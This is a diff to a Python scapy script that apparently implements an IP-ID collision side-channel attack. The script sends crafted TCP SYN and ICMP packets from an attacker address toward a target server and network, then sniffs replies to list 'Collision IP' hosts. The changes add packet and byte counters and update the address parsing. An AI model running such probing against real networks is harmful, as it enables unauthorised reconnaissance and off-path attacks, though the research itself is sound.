@@ -3,6 +3,7 @@
 import struct
 import threading
 import time
+import socket
 from scapy.all import *
 from scapy.layers.inet import *
 from scapy.layers.l2 import *
@@ -27,7 +28,7 @@ class Task:
         return hash(self.addr)
 
 
-class Collision_Finder_1:
+class Collision_Prob:
 
     def __init__(self, attack_target_server='10.10.100.2', bind_iface_name='ens33',
                  attack_target_network='20.0.0.0', net_type='B', num_thread=5, block_size=100,
@@ -52,17 +53,23 @@ class Collision_Finder_1:
         self.__task_list = []
 
         d_net_type = {'A': 24, 'a': 24, 'B': 16, 'b': 16, 'C': 8, 'c': 8}
-        self.__start_point = int(socket.inet_aton(self.net_work_num).encode('hex'), 16)
+        self.__start_point = socket.ntohl(struct.unpack("I",socket.inet_aton(str(self.net_work_num)))[0])
         self.__current_point = self.__start_point
         self.__end_point = self.__start_point + (1 << d_net_type[net_type]) - 1
         self.__stop = False
         self.result = []
+
+        self.send_n = 0
+        self.send_byte = 0
+        self.cost_time = -1
 
         for i in range(0, 520):
             self.__z_payload += struct.pack('B', 0)
 
     def check_new_list(self, list_d):
         C = len(list_d)
+        L = 0
+
         icmp_seq = random.randint(0, (1 << 16) - 1)
 
         send_list = []
@@ -79,8 +86,13 @@ class Collision_Finder_1:
                              TCP(sport=RandShort(), dport=22, flags='S'))
             send_list.append(IP(src=self.attacker_ip, dst=self.server_ip) / ICMP(id=icmp_seq))
 
+        for pkg in send_list:
+            L += len(pkg)
+
         while True:
             self.__semaphore_ipid.acquire()
+            self.send_byte += L
+            self.send_n += len(send_list)
             pkts = sniff(filter="icmp and icmp[4:2]=" + str(icmp_seq) + " and dst " + self.attacker_ip,
                          iface=self.my_if_name, count=1 + C, timeout=2, started_callback=
                          lambda: send(send_list, iface=self.my_if_name, verbose=False))
@@ -193,7 +205,8 @@ class Collision_Finder_1:
         print('Target Network: ' + self.net_work_num)
         for i in range(len(self.result)):
             print('Collision IP ' + str(i) + ' : ' + self.result[i])
+        print('Send Packets: ' + str(self.send_n))
+        print('Send Bytes: ' + str(self.send_byte) + ' (Bytes)')
         print('Cost Time: ' + str(te - ts) + ' (s)')
-
-        return te - ts
+        self.cost_time = te - ts
 
